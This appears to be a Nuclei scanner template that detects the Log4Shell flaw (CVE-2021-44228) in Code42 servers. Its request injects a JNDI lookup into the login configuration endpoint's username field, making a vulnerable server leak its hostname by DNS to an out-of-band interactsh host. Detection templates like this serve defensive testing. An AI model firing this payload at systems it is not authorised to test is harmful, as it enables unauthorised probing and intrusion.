id: code42-log4j-rce
info:
  name: Apache Code42 -  Remote Code Execution (Apache Log4j)
  author: Adam Crosser
  severity: critical
  description: Multiple components of Code42 were impacted by a Log4j vulnerability,
    prompting updates to address potential remote code execution vulnerabilities.
  reference:
  - https://support.code42.com/Terms_and_conditions/Code42_customer_support_resources/Code42_response_to_industry_security_incidents
  - https://logging.apache.org/log4j/2.x/security.html
  - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cve-id: CVE-2021-44228
    cwe-id: CWE-77
  tags: jndi,log4j,rce,cve,cve2021,oast,code42,kev
  metadata:
    impact: The Log4j vulnerability has impacted multiple Code42 components, leading
      to updates and mitigations to prevent remote code execution.
    recommendation: Update all Code42 components to Log4j version 2.17.1 or follow
      mitigation steps to protect against the code42-log4j-rce vulnerability.
requests:
- method: GET
  path:
  - '{{BaseURL}}/c42api/v3/LoginConfiguration?username=${jndi:ldap://${hostName}.{{interactsh-url}}/test}&url=https://localhost'
  matchers-condition: and
  matchers:
  - type: word
    part: interactsh_protocol
    words:
    - dns
  - type: regex
    part: interactsh_request
    regex:
    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
  extractors:
  - type: regex
    part: interactsh_request
    group: 1
    regex:
    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
